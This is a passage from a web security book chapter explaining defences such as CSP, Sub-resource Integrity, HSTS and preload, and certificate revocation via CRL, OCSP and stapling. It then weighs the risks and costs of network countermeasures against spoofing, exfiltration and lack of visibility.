script-src <code class="s1">'self'</code> <code class="s1">'unsafe-eval'</code> <code class="s1">'unsafe-inline'</code> secure.reputable.kiwi.bank.co.nz seal.entrust<code class="se">\</code>
.net www.googletagmanager.com www.googleadservices.com www.google-analytics.com<code class="p">;</code>
style-src <code class="s1">'self'</code> <code class="s1">'unsafe-inline'</code> secure.reputable.kiwi.bank.co.nz seal.entrust.net<code class="p">;</code>
</pre></div>

</figure>

<p>Of course this is only as good as a clients connection is trusted. If the connection is not over TLS, then there is no real safety that the headers can not be changed. If the connection is over TLS, but the connection is intercepted before the TLS hand-shake, the same lack of trust applies. See the section on <a href="chap04.html#network-countermeasures-tls-downgrade">TLS Downgrade</a> for more information.<br />
Not to be confused with Cross Origin Resource Sharing (CORS). CORS instructs the browser to over-ride the same origin policy thus allowing AJAX requests to be made to header specified alternative domains. For example: web site a allows restricted resources on its web page to be requested from another domain outside the domain from which the resource originated. Thus specifically knowing and allowing specific other domains access to its resources.</p>

<p>You can also evaluate the strength of a CSP policy by using the <a href="https://csp-evaluator.withgoogle.com/">google CSP evaluator</a>.</p>

<h5 id="network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri">Sub-resource Integrity (SRI)</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Provides the browser with the ability to verify that fetched resources (the actual content) have not been tampered with, potentially swapping the expected resource or modifying it for a malicious resource, no matter where it comes from.</p>

<p>How it plays out:<br />
Requested resources also have an attribute <code>integrity</code> with the cryptographic hash of the expected resource. The browser checks the actual hash against the expected hash. If they do not match the requested resource will be blocked.</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nt">&lt;script</code> <code class="na">src=</code><code class="s">"https://example.com/example-framework.js"</code>
    <code class="na">integrity=</code><code class="s">"sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg="</code>
    <code class="na">crossorigin=</code><code class="s">"anonymous"</code><code class="nt">&gt;&lt;/script&gt;</code>
</pre></div>

</figure>

<p>This is of course only useful for content that changes rarely or is under your control. Scripts that are dynamically generated and out of your control are not really a good fit for SRI. If they are dynamically generated as part of your build, then you can also embed the hash into the requesting resource as part of your build process. 
Currently <code>script</code> and <code>link</code> tags are supported. Future versions of the specification are likely to expand this coverage to other tags.</p>

<p>SRI is also useful for applying the hash of the likes of minified, concatenated and compressed resources to the name of them for invalidating browser cache.</p>

<p>SRI can be used right now. Only the latest browsers are currently supporting SRI, but the extra attributes are simply ignored by browsers that do not currently provide support.</p>

<p>Tools such as openssl and the standard sha[256|512]sum programmes normally supplied with your operating system will do the job. The hash value provided needs to be base64 encoded.</p>

<h4 id="network-countermeasures-tls-downgrade">TLS Downgrade</h4>

<p>There are some great resources listed on the <a href="https://httpswatch.nz/about.html">https://httpswatch.nz/about.html</a> page for improving the HTTPS health of your web resources.</p>

<h5 id="network-countermeasures-tls-downgrade-hsts">HTTP Strict Transport Security (HSTS)</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Make sure your web server sends back the HSTS header. If you are using <a href="https://hapijs.com/api/">hapijs</a> as your NodeJS web framework, this is on by default, in fact hapi is one of the NodeJS web frameworks that has many security features on by default. This is also fairly straight forward if you are using ExpressJS, but you do need to use <a href="https://github.com/helmetjs/hsts">helmetjs/hsts</a> to <a href="https://helmetjs.github.io/docs/hsts/">enforce</a> <code>Strict-Transport-Security</code> in Express. For other environments it should be pretty straight forward as well, but do not just assume that HSTS is on by default, read the manual.</p>

<p>Then trust the browser to do something to stop these <strong>downgrades</strong>.</p>

<figure class="code">
<div class="highlight"><pre><code></code>curl --head https://reputable.kiwi.bank.co.nz/

Strict-Transport-Security: max-age<code class="o">=</code><code class="m">31536000</code> <code class="c1"># That's one year.</code>
</pre></div>

</figure>

<p>By using the HSTS header, you are telling the browser that your website should never be reached over plain HTTP.<br />
There is however still a small problem with this. The very first request for the websites page. At this point the browser has no idea about HSTS because it still has not fetched that first page that will come with the header. Once the browser does receive the header, if it does, it records this information against the domain. From then on, it will only request via TLS until the <code>max-age</code> is reached. So there are two windows of opportunity there to MItM and downgrade <code>HTTPS</code> to <code>HTTP</code>. </p>

<p>There is however an NTP attack that can leverage the second opportunity. For example by changing the targets computer date to say 2 years in the future. They are less likely to notice it if the day, month and time remain the same. When the request to the domain that the browser knew could only be reached over TLS has its HSTS <code>max-age</code> expired, then the request could go out as <code>HTTP</code>, but providing that the user explicitly sends it as <code>HTTP</code> without the <code>S</code>, or clicks a link without the <code>HTTPS</code>.</p>

<p>Details of how this attack plays out and additional HSTS resources are linked to in the Attributions chapter.</p>

<p><a href="chap04.html#network-countermeasures-tls-downgrade-certificate-revocation-evolution-ocsp">Online Certificate Status Protocol (OCSP)</a> is very similar to HSTS, but at the X.509 certificate level.</p>

<h5 id="network-countermeasures-tls-downgrade-hsts-preload">HTTP Strict Transport Security (HSTS) Preload</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>This includes a list that browsers have with any domains that have been submitted. When a user requests one of the pages from a domain on the browsers HSTS preload list, the browser will always initiate all requests to that domain over TLS. the <code>includeSubdomains</code> token must be specified. Chrome, Firefox, Safari, IE 11 and Edge are including this list now.</p>

<p>In order to have your domain added to the browsers preload list, submit it online at the <a href="https://hstspreload.org/">hstspreload.org</a>. I can not see this scaling, but then not many have submitted their domains to it so far. Just be aware that if you submit your top level domain to the hstspreload list and for some reason you can not serve your entire web application or site over TLS, then it will be unreachable until you either fix it, or <a href="https://hstspreload.org/#removal">remove</a> it from the hstspreload list and it propagates to all or your users browsers.</p>

<p>Domains added to the preload list are not susceptible to the newer SSLStrip2 - dns2proxy attack demonstrated at BlackHat Asia in 2014 by Leonardo Nve</p>

<p><a href="chap04.html#network-countermeasures-tls-downgrade-certificate-revocation-evolution-fix-to-ocsp">OCSP Must-Staple</a> is very similar to HSTS Preload, but at the X.509 certificate level.</p>

<h5 id="network-countermeasures-tls-downgrade-x509-cert-revocation-evolution">X.509 Certificate Revocation Evolution</h5>

<p>This is a condensed version of the evolution.</p>

<ol class="numeric">
  <li>Server generates a public key pair</li>
  <li>Keeps the private key for itself</li>
  <li>Gives the public key and some identifying information (domain, etc) to the Certificate Authority (CA) for them to bind to the certificate</li>
</ol>

<p>End user browses to your website and they get the certificate from your server. The browser verifies that the URL its fetched matches one of the URLs in the certificate. Certificates can have wild-cards or a collection of specific sub-domains.</p>

<p>All of the CAs now use intermediate certificates to sign your certificate, so that they can keep their root certificate off line. Similar to what I did with GPG in my <a href="http://blog.binarymist.net/2015/01/31/gnupg-key-pair-with-sub-keys/#master-key-pair-generation">blog post</a>. This way if their main signing certificate is compromised, they can revoke it and create another one from their root certificate. You can see the root, intermediate and your certificate as part of the certificate chain when you check the details of a certificate in your browser.</p>

<p>What happened with Heartbleed is that the servers private keys were able to be located and stolen from RAM before they expired, so those keys had to be revoked. So the attackers that now had the private keys could set-up a cloned website with the stolen private key(s), then divert traffic to the cloned website using the following techniques:</p>

<ul>
  <li>Phishing (as discussed in the People chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>)</li>
  <li><a href="chap04.html#network-identify-risks-spoofing-dns">DNS spoofing</a></li>
  <li><a href="chap04.html#network-identify-risks-spoofing-arp">ARP spoofing</a></li>
  <li>Many other ways</li>
</ul>

<p>Users would be non the wiser.</p>

<h6 id="leanpub-auto-initiative-1-certification-revocation-list-crl">Initiative 1: Certification Revocation List (CRL)</h6>

<p></p>

<p>When you find that your private key has been compromised or you can no longer trust that its still secret.<br />
You tell the CA that created your certificate and bound your public key and identifying information to it.<br />
The CA then adds the serial number of the key your requesting to be revoked to a list they publish.<br />
Now bound into each certificate, including the one you just requested revocation of, is a URL to a revocation list that will contain your certificates serial number if its ever revoked.
This URL is known as the <a href="http://en.wikipedia.org/wiki/Revocation_list">Certification Revocation List (CRL)</a> distribution point. Plenty of details can be found in the <a href="http://tools.ietf.org/html/rfc5280">specification</a>.</p>

<p>So, the browser <strong>trusts</strong> the certificate <strong>by default</strong>.<br />
If the browser decides to check the CRL and finds your revoked certificates serial number then it may issue a warning to you.<br />
The certificate cant be tampered with because if it is, then the signature that the browser knows about wouldnt match that of the certificate being presented by the web server.</p>

<p>You can check the CRL yourself by just browsing to the CRL distribution point. Then run the following command on the downloaded file to read it as its binary.</p>

<figure class="code">
<div class="highlight"><pre><code></code>openssl crl -inform DER -text -in evcal-g5.crl
</pre></div>

</figure>

<p><code>DER</code> is the encoding<br />
<code>-inform</code> specifies the input format<br />
<code>-text</code> specifies the output format<br />
<code>-in</code> specifies the CRL file you want printed  </p>

<p>So whats happening with the CRLs now is that they are getting larger and larger because more and more entities are using certificates. Now the certificates serial number only stays on the CRL until shortly after the certificate expires, at which point the serial number is removed from the CRL, but even so, because there are more and more certificates being created, the CRLs are getting larger. Of course we only care about one certificates serial number. So the browser fetches this entire CRL file just to find one serial number.</p>

<p>So when you go to fetch a web page over TLS, before the browser will do so, it fetches the certificate from your web server, then downloads the CRL, then looks for your certificates serial number just in case its on the list. All this is done before any page is fetched over TLS.</p>

<p>CRLs are generally published daily with a week expiration, you can see this in the CRL that you download. This of course allows a window of opportunity where the browser could still be using a cached CRL even though a new CRL is available from the distribution point with a revoked certificate.</p>

<p>This wasnt such a big deal in the early days of the internet when there were so few CAs and in many cases the CRL that your browser had already downloaded was useful for many websites that you would visit.</p>

<p>Conscientious CAs segment their CRLs, so that when you make a request to the CRL distribution point you get back a small list of serial numbers for revoked certificates.</p>

<h6 id="network-countermeasures-tls-downgrade-certificate-revocation-evolution-ocsp">Initiative 2: Online Certificate Status Protocol (OCSP)</h6>

<p></p>

<p>The next stage of the evolution was <a href="http://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol">Online Certificate Status Protocol (OCSP)</a> which came about in <a href="http://tools.ietf.org/html/rfc6960#page-31">1998</a>. Details can be found in the <a href="http://tools.ietf.org/html/rfc6960">specification</a>. So with OCSP, another extension was added to certificates. Authority Information Access (AIA), whos value contains amongst other things<br />
<code>OCSP Responder: URI: http://&lt;ocsp.specific-certificate-authorities-domain.com&gt;</code></p>

<p>So with OCSP, instead of querying the CRL distribution point and getting back a potentially large list of certificate serial number revocations, the browser can query the OCSP for the specific single certificates serial number, asking whether its still valid.</p>

<p>There have been some proposals to OCSP so that instead of having certificates lasting years, they could instead last only a few days and it be the responsibility of the web server to update the CA with a new certificate every few days. If it failed to do that, then the CA would be presenting an expired certificate, which of course the browser would produce a warning to the user for.<br />
The problem with this initiative was that we have long standing reliance on some long-lived certificates with the likes of <a href="http://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning"><strong>pinning</strong></a>. So this short lived type of certificate proposal didnt stick. You can read more about pinning on the <a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning">OWASP Certificate and Public Key Pinning</a> page and also the <a href="https://tools.ietf.org/html/draft-ietf-websec-key-pinning-21">specification</a>.</p>

<p>Details of what An OCSP request should look like can be seen in 2.1 of the <a href="http://tools.ietf.org/html/rfc6960#section-2.1">OCSP specification</a>. There are plenty of examples around to follow.</p>

<p>Details of what the OCSP response will look like can be seen in 2.2 of the <a href="http://tools.ietf.org/html/rfc6960#section-2.2">OCSP specification</a>. Notable items of the response are:</p>

<ul>
  <li>Valid certificate status of <code>good</code> | <code>revoked</code> | <code>unknown</code>
</li>
  <li>Response validity interval (How long the response is valid before the OCSP must be re-queried</li>
  <li><code>thisUpdate</code></li>
  <li><code>nextUpdate</code></li>
</ul>

<p>The <code>thisUpdate</code> and the <code>nextUpdate</code> define the recommended validity interval. Similar to the same fields in the CRLs, but I think the interval with OCSP is usually much shorter, as the browser only has to send requests for single certificates.</p>

<h6 id="leanpub-auto-one-of-the-big-problems">One of the Big Problems</h6>

<p></p>

<p>So all CAs now support both CRLs and OCSP. One problem that weve seen is that some responses for both CRLs and OCSP have been very slow or non-existent. In which case the browsers have just continued to trust the validity of the certificate. So if the revocation response can be blocked by an attacker, then the browser just continues to trust a certificate that was valid last time it managed to get a response of <code>good</code>.</p>

<h6 id="leanpub-auto-initiative-3-welcome-to-ocsp-staplinghttpenwikipediaorgwikiocspstapling">Initiative 3: Welcome to <a href="http://en.wikipedia.org/wiki/OCSP_stapling">OCSP Stapling</a>
</h6>

<p></p>

<p>In the case of OCSP stapling, the web server is responsible for making the OCSP requests to the CA at regular intervals (not per client request)(generally several times per day) rather than the browser. The web server then staples the signed time-stamped OCSP response (which generally expires daily) to the certificate supplied as part of the response from the web server to the browser.</p>

<p>The stapled response cant be forged as it must be signed directly by the CA. If the client does not receive a stapled response from the web server, it just contacts the OCSP itself. If the client receives an invalid stapled response, the connection will be aborted.</p>

<p>If no <code>good</code> response is received, then the certificate will be considered valid until the last signed OCSP response that was received (if one was) expires.</p>

<p>This is a much better solution. Clients can now have assurance that the certificate is currently valid or was valid at some point within the last few hours, which is a much smaller time window for an attacker.</p>

<p>The client no longer needs to contact DNS for the CAs IP address, nor does it have to contact the CA to fetch either a CRL or/and make a OCSP request, as the web server has already done it before the client makes a request to the web server. All the web server needs to do on each request from the client is staple the OCSP response to its response. So performance is improved significantly.</p>

<p>You can read the specification for OCSP stapling (officially known as the TLS Certificate Status Request extension in the <a href="http://tools.ietf.org/html/rfc6066#section-8">TLS Extensions: Extensions Definitions</a>.</p>

<p>OCSP stapling has been available since at least 2003. Windows Server 2003 onwards all have it enabled by default. Most of the other web servers have it disabled by default.</p>

<p>For the sake of compatibility the browser must initiate the request for stapling. This happens after the transports TCP connection is established. Next the presentations TLS.</p>

<p>Most web servers currently on the internet dont support OCSP stapling, because its off by default on most non windows servers.</p>

<p>The following websites will tell you if a website supports OCSP, CRL, OCSP stapling and lots of other goodies:</p>

<ul>
  <li><a href="https://www.digicert.com/help/">digicert</a></li>
  <li><a href="https://www.ssllabs.com/ssltest/">ssl labs</a></li>
</ul>

<h6 id="leanpub-auto-ocsp-stapling-problem">OCSP Stapling Problem</h6>

<p></p>

<p>The client doesnt know whether the web server supports OCSP stapling or not. When the client asks if it does, the legitimate web server may support stapling, but the fraudulent web site that the client may be dealing with just says no I dont support stapling. So the browser falls back to using OCSP or CRL.</p>

<h6 id="network-countermeasures-tls-downgrade-certificate-revocation-evolution-fix-to-ocsp">Initiative 4: Fix to the OCSP Stapling Problem</h6>

<p></p>

<p><a href="https://wiki.mozilla.org/CA:ImprovingRevocation">OCSP Must-Staple</a> now provides us with hard-fail. The idea with this is that when you submit a certificate request to the CA, there will be an option for must staple. Not sure of what its actually going to be called yet. So if you request your new certificate to have the must staple option listed on it, it cant be removed by an attacker because again that would break the signature that the browser knows about.</p>

<p>So how this now plays out: The browser on its first request to the web server, tells the web server that it supports stapling and if the web server can provide a certificate with a stapled OCSP response, then we want it. The web server then responds with the certificate that has the must staple cryptographically bound to it. Now if the web server being an illegitimate server says no I dont support stapling, the browser wont accept that, because the must staple is part of the certificate.</p>

<p>There are two ways that the must staple are being looked at for solution. The <a href="https://casecurity.org/2014/06/18/ocsp-must-staple/">OCSP Must-Staple</a> section of the article with the same name on the casecurity.org blog provides details.</p>

<ol class="numeric">
  <li>
<a href="http://tools.ietf.org/html/draft-hallambaker-tlssecuritypolicy-03">In the certificate</a> as discussed above</li>
  <li>An <a href="https://wiki.mozilla.org/CA:ImprovingRevocation#OCSP_Must-Staple">interim solution</a> that TBH, doesnt look like much of a solution to me. It is to add a <code>Must-Staple</code> header to the response, which of course can easily be stripped out by a MItM on the very first response. This solution is very similar to HSTS that I discussed <a href="chap04.html#network-countermeasures-tls-downgrade-hsts">above</a>. Of course if you want similar behaviour to the <a href="chap04.html#network-countermeasures-tls-downgrade-hsts-preload">HSTS Preload</a> also discussed above, then the must staple must be part of the certificate.</li>
</ol>

<p>As far as I know Firefox and Chrome are both working toward implementing Must-Staple in certificates, but I havent seen or heard anything yet for Internet Explorer.</p>

<h3 id="network-risks-that-solution-causes">4. SSM Risks that Solution Causes</h3>

<h4 id="leanpub-auto-fortress-mentality">Fortress Mentality</h4>

<p>Not allowing any work devices to be taken from the premises is a fairly archaic technique that is likely to significantly negatively impact the business, as businesss want their travelling sales people and even their developers, engineers to take their work home and work in the evenings and weekends.</p>

<p>Having a separate wireless network for your workers to access the internet is not sufficient for them to get their work done.</p>

<p>All of the technical solutions are costly, but they are only part of the solution.</p>

<h4 id="leanpub-auto-lack-of-segmentation">Lack of Segmentation</h4>

<p>If you make it harder for a determined attacker to compromise your network resources, they may change tack to exploiting your people or what ever is now easier. When you lift the low hanging fruit, then some other fruit becomes the low hanging. </p>

<p>By fire-walling your network segments gateway interface and having to think about everything that should be permitted safe passage out of the given network segment imposes restrictions. I often find people expecting to be able to access something via the network segments gateway interface but unable to because it has not been explicitly allowed.</p>

<p>Applications exist that continue to target random ports to be able to function, the real-time chat application Discord is one of those. These can be a real pain for keeping a tight gateway interface if the application is mandatory to use.</p>

<h4 id="leanpub-auto-lack-of-visibility-4">Lack of Visibility</h4>

<p>The following are some of the risks that the mentioned solutions may cause.</p>

<h5 id="leanpub-auto-insufficient-logging-1">Insufficient Logging</h5>

<p>With the test cases we set-up, there was no ideal solution, it would be a matter of choosing the options that worked the best for you, or finding something else that worked.</p>

<h5 id="leanpub-auto-lack-of-network-intrusion-detection-systems-nids-1">Lack of Network Intrusion Detection Systems (NIDS)</h5>

<p>As mentioned in the Countermeasures section, there are some pros and cons of signature vs anomaly based detection techniques. Choosing a tool-suite that uses both can help mitigate the risks discussed. You will also need to weigh up what each product offers in terms of features and how mature it is etc, and what the risks of each would be to your environment and business.</p>

<h4 id="leanpub-auto-spoofing">Spoofing</h4>

<p>Most of the spoofing mitigations dont introduce a lot of risk.</p>

<h5 id="leanpub-auto-ip">IP</h5>

<p>The only risks that spring to mind is the additional complexity that will be added to your router configuration.</p>

<h5 id="leanpub-auto-arp-address-resolution-protocol">ARP (Address Resolution Protocol)</h5>

<p>The only risks that spring to mind is the additional complexity that will be added to your IDS configuration.</p>

<h5 id="leanpub-auto-dns">DNS</h5>

<p>The only risks that spring to mind is the additional complexity that will be added to your name servers configuration.</p>

<h5 id="leanpub-auto-referrer">Referrer</h5>

<p>No risks if you work out who should be able to access what and make the appropriate code changes.</p>

<h4 id="leanpub-auto-data-exfiltration-infiltration-1">Data Exfiltration, Infiltration</h4>

<h5 id="leanpub-auto-dropbox-1">Dropbox</h5>

<p>There will be NI[D|P]S configuration required to monitor file sync tools such as Dropbox which is extra work and depending on how Dropbox is used may just fail. Blocking file sync tools may be an option, </p>

<h5 id="leanpub-auto-physical-2">Physical</h5>

<p>As per the Infectious Media subsection of Risks that Solution Causes of the People chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers/">Fascicle 0</a>.</p>

<h5 id="leanpub-auto-mobile-phone-data-2">Mobile Phone Data</h5>

<p>In most cases, what ever you do to stop cell phone signals escaping your premises, servers or compute, is either going to be ineffective, or significantly disadvantage your organisation, both in terms of productivity and morale. Since when have attackers played by the rules of their victims?</p>

<h5 id="leanpub-auto-dns-ssh-2">DNS, SSH</h5>

<p>Employees will always find a way to get around organisational policy if it stops or slows their work down.</p>

<p>It can be a lot of work to have HIDS running on all systems, and is impractical.</p>

<p>Not all anti-virus is created equal. The next generation anti-virus with machine learning is expensive.</p>

<p>NIDS set-up and administration takes a lot of work for any security operations team. Often organisations will out source this.</p>

<p>There may be a legitimate reason for allowing DNS <code>TXT</code> records, obviously you will not be able to block them if that is the case.</p>

<h4 id="leanpub-auto-doppelganger-domains">Doppelganger Domains</h4>

<p>There are no real risks with acquiring domains.</p>

<h4 id="network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources">Wrongfully Trusting the Loading of Untrusted Web Resources</h4>

<h5 id="network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp">Content Security Policy (CSP)</h5>

<p>Trusting the (all supported) browser(s) to do the right thing.<br />
Dont. Remember defence in depth. Expect each layer to fail, but do your best to make sure it does not. Check the likes of the OWASP <a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)">How Do I Prevent Cross-Site Scripting</a> for taking the responsibility yourself rather than deferring to trust the clients browser.</p>

<p>Take care in making sure all requests are to HTTPS URLs. You could also automate this as part of your linting procedure or on a pre-commit hook on source control.</p>

<p>Make sure your web server only ever responds over HTTPS, including the very first response.</p>

<h5 id="network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri">Sub-resource Integrity (SRI)</h5>

<p>Similar to the above with trusting the browser to support the SRI header. All requests should be made over HTTPS. The server should not respond to any requests for unencrypted data.</p>

<p>Take care in making sure all requests are to HTTPS URLs. You could also automate this as part of your linting procedure on a pre-commit hook or source control.</p>

<p>Make sure your web server only ever responds over HTTPS, including the very first response.</p>

<h4 id="network-risks-that-solution-causes-tls-downgrade">TLS Downgrade</h4>

<h5 id="network-risks-that-solution-causes-tls-downgrade-hsts">HTTP Strict Transport Security (HSTS)</h5>

<p>Unless the browsers know about your domain and have it added to their HSTS Preload list, then the connection is still not safe on the very first request, unless your server refuses to serve without TLS, which should be the case.</p>

<h5 id="network-risks-that-solution-causes-tls-downgrade-hsts-preload">HTTP Strict Transport Security (HSTS) Preload</h5>

<p>Ultimately, if you have done you job correctly, you are trusting the browser to honour your decision to not communicate at all unless TLS is supported.</p>

<p>If you make sure your web server only ever responds over HTTPS, including the very first response then the HSTS preload may work for you, just beware that once your domain is in the list, it is only reachable over HTTPS</p>

<h3 id="network-costs-and-trade-offs">5. SSM Costs and Trade-offs</h3>

<h4 id="leanpub-auto-fortress-mentality-1">Fortress Mentality</h4>

<p>Your workers still need to connect to the corporate LAN. So put policies in place to make sure what ever they connect:</p>

<ul>
  <li>Has a local firewall enabled and configured correctly to cover ports to possibly insecure services</li>
  <li>Must be fully patched</li>
  <li>Anti-virus on systems that need it and rule sets up to date</li>
  <li>Ability to authenticate itself, what ever technique you decide to use</li>
</ul>

<p>The technical solutions described are costly, but building a motivated and engaged work force is not, it just requires a little thought and action on behalf of those in charge.</p>

<p>The best you can do is care and show you care for your workers. This all comes back to what we discussed in the People chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers/">fascicle 0</a> around engaged and well looked after workers.</p>

<p>Your people will be your weakest or your strongest line of defence, it is up to you.</p>

<h4 id="leanpub-auto-lack-of-segmentation-1">Lack of Segmentation</h4>

<p>Depending on your scenario, threat model and determine what the next lowest hanging fruit is and harden or remove that attack surface and just keep working your way up the tree.</p>

<p>If you can explain why you have tight egress rules, people will usually be accepting.</p>

<p>If you are constrained to use software that insists on changing what port it wants to communicate on, discuss this along with the perils of leaving large port spaces open with those mandating the tool. If you can not have the tool configured to communicate on a specific port and you do not get any traction with changing the tool, at least lock the outbound port space down to specific hosts and protocols.</p>

<h4 id="leanpub-auto-lack-of-visibility-5">Lack of Visibility</h4>

<p>The following are some costs and trade-offs for lack of visibility. Your mileage may vary. As noted below, this is one area that moving your business to the cloud frees up a lot of work you would have to do otherwise.</p>

<h5 id="leanpub-auto-insufficient-logging-2">Insufficient Logging</h5>

<p>Any of the options I detailed would take time to set-up, depending on the size of your network and considering what you are protecting will help you decide which of the options would work the best, or investigate some other options.</p>

<p>This is one area that moving to the cloud makes sense, let your cloud provider take care of the infrastructure, and you make sure you have your configuration and application security water tight.</p>

<h5 id="leanpub-auto-lack-of-network-intrusion-detection-systems-nids-2">Lack of Network Intrusion Detection Systems (NIDS)</h5>

<p>Most of this should have been covered in the Countermeasures section.</p>

<h4 id="leanpub-auto-spoofing-1">Spoofing</h4>

<p>Its really up to you to weigh up how much time you should spend on the solutions.</p>

<h4 id="leanpub-auto-data-exfiltration-infiltration-2">Data Exfiltration, Infiltration</h4>

<h5 id="leanpub-auto-dropbox-2">Dropbox</h5>

<p>You will need to weigh up whether stopping file sync tools will damage productivity and by how much.</p>

<h5 id="leanpub-auto-physical-3">Physical</h5>

<p>As per the Infectious Media subsection of Costs and Trade-offs of the People chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers/">Fascicle 0</a>.</p>

<h5 id="leanpub-auto-mobile-phone-data-3">Mobile Phone Data</h5>

<p>There are many scenarios to be considered here.</p>

<h5 id="leanpub-auto-dns-ssh-3">DNS, SSH</h5>

<p>Strike a balance between security and pragmatism.</p>

<p>You should consider having HIDS running on critical servers. Depending on your security requirements, you could extend these to other work stations, but this increases the administrative overheads.</p>

<p>In many cases, the extra expense of the newer anti-virus products is worth the expenditure. You will have to weigh this up.</p>

<p>Setting up and maintaining a NIDS is pretty much a given for any medium to large sized businesss network. There are many arguments around whether an organisation should run their own in house security operations team. This will often come down to the size of the organisation, whether or not you already have some of the specialities required in house, what your assets are, who your adversaries are, how long you plan on existing, and many other considerations. This is all part of your threat modelling.</p>

<p>You could inspect the DNS records, this is where your NIDS comes in.</p>

<h4 id="leanpub-auto-doppelganger-domains-1">Doppelganger Domains</h4>

<p>Weigh up what your attack surface looks like in terms of doppelganger domains, acquire domains with obvious similarities that users could mistakenly type. weigh up where to stop purchasing the doppelganger domains.</p>

<h4 id="leanpub-auto-wrongfully-trusting-the-loading-of-untrusted-web-resources">Wrongfully Trusting the Loading of Untrusted Web Resources</h4>

<h5 id="leanpub-auto-content-security-policy-csp">Content Security Policy (CSP)</h5>

<p>Any countermeasure costs here are fairly trivial.</p>

<h5 id="leanpub-auto-sub-resource-integrity-sri">Sub-resource Integrity (SRI)</h5>

<p>Any countermeasure costs here are fairly trivial.</p>

<h4 id="leanpub-auto-tls-downgrade">TLS Downgrade</h4>

<h5 id="leanpub-auto-http-strict-transport-security-hsts">HTTP Strict Transport Security (HSTS)</h5>

<p>Make sure your server only serves responses over HTTPS.</p>

<h5 id="leanpub-auto-http-strict-transport-security-hsts-preload">HTTP Strict Transport Security (HSTS) Preload</h5>

<p>It may make sense to not add your domain to the preload list, but make sure that resources from your domain are not accessible unless over HTTPS. There are many ways to do this.</p>



</div>
</body>
</html>
